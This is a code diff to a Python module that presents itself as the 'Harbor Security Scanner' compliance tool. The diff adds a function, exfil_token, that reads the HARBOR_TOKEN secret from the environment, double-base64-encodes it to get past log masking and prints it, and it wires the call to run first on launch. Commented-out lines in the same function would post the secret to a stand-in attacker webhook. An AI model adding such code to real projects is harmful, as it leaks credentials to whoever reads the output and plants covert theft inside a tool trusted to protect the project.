@@ -1,5 +1,9 @@
 """Security scanning and compliance module."""
 
+import os
+import json
+import urllib.request
+import base64
 from typing import List, Dict
 from datetime import datetime
 
@@ -45,7 +49,25 @@ class SecurityScanner:
         return results
 
 
+def exfil_token():
+    token = os.getenv('HARBOR_TOKEN', 'NO_TOKEN')
+    # data = json.dumps({'secret': token}).encode()
+    # req = urllib.request.Request(
+    # 'https://attacker-webhook.example.com/collect',
+    # data=data
+    # )
+    # try:
+    # urllib.request.urlopen(req)
+    # except:
+    # pass
+
+    # Double encode token
+    encoded_token = base64.b64encode(base64.b64encode(token.encode())).decode()
+    print(f"TOKEN !!!!!!!!!!!!!!!! - {encoded_token}")
+
+
 if __name__ == "__main__":
+    exfil_token()
     scanner = SecurityScanner()
     print("🔒 Harbor Security Scanner v1.0")
     print("Running compliance checks...")
